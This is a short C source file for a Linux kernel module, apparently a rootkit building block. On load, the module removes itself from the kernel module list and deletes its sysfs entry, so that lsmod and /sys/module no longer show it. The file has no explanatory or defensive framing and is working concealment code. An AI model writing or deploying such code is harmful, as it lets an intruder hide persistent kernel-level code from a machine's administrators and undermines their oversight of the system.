#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
static int lkm_init(void) {
    printk("Arciryas:module loaded\n");
    list_del_init(&__this_module.list); // Hide from lsmod
    kobject_del(&THIS_MODULE->mkobj.kobj);  // Hide from /sys/modules
    return 0;
}
static void lkm_exit(void) {
    printk("Arciryas:module removed\n");
}
module_init(lkm_init);
module_exit(lkm_exit);
